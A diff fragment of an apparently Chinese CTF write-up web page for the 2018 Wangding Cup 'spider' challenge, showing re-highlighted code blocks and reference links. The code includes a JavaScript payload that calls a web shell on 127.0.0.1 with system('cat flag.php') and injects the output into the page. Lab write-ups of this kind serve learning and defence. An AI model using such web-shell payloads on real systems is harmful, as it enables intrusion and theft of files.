+		<span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">formData</span>);
+	&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">html</span>&gt;
+	&lt;<span style="color:#f92672">body</span>&gt;
+		&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test&#39;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;1&lt;/<span style="color:#f92672">a</span>&gt;
+		&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1/vendor/jquery-1.11.1.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+		&lt;<span style="color:#f92672">script</span>&gt;
+		<span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;http://127.0.0.1:8000/shell.php?_=system(&#34;cat flag.php&#34;);&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>){
+			document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;test&#34;</span>).<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">=</span><span style="color:#a6e22e">data</span>;
 		});
-		&lt;/script&gt;
-	&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-
-<p>还是太菜了（哭泣😭</p>
-
+		&lt;/<span style="color:#f92672">script</span>&gt;
+	&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>还是太菜了（哭泣😭</p>
 <h2 id="参考链接">参考链接</h2>
-
 <ul>
-<li><a href="https://mp.weixin.qq.com/s/yZ-Xp32tCPWbDiFgAHiWgw" rel="nofollow noreferrer" target="_blank">网鼎杯第一场spider题详细writeup</a></li>
-<li><a href="https://xz.aliyun.com/t/2607" rel="nofollow noreferrer" target="_blank">2018网鼎杯第一场Web题解</a></li>
+<li><a href="https://mp.weixin.qq.com/s/yZ-Xp32tCPWbDiFgAHiWgw">网鼎杯第一场spider题详细writeup</a></li>
+<li><a href="https://xz.aliyun.com/t/2607">2018网鼎杯第一场Web题解</a></li>
 </ul>
 
     </div>
